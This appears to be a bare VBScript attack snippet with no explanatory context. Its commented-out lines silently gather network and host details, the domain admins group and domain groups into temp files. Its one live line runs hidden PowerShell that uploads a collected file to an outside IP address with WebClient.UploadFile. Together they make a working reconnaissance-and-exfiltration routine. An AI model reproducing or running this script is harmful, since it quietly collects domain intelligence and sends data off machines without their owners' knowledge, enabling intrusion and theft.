Set oShell = WScript.CreateObject("WScript.Shell")
'return = oShell.run("cmd /c ipconfig >> %TEMP%\ipconfig.txt", 0, true)
'return = oShell.run("cmd /c netstat >> %TEMP%\netstat.txt", 0, true)
'return = oShell.run("cmd /c hostname >> %TEMP%\hostname.txt", 0, true)
'return = oShell.run("cmd /c net group 'domain admins' /domain >> %TEMP%\domainadmins.txt", 0, true)
'return = oShell.run("cmd /c net localgroup /domain >> %TEMP%\localgroup.txt", 0, true)

return = oShell.run("powershell.exe $file='c:\temp\hostname.txt'; $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('http://10.64.111.156',$file)", 0, true)
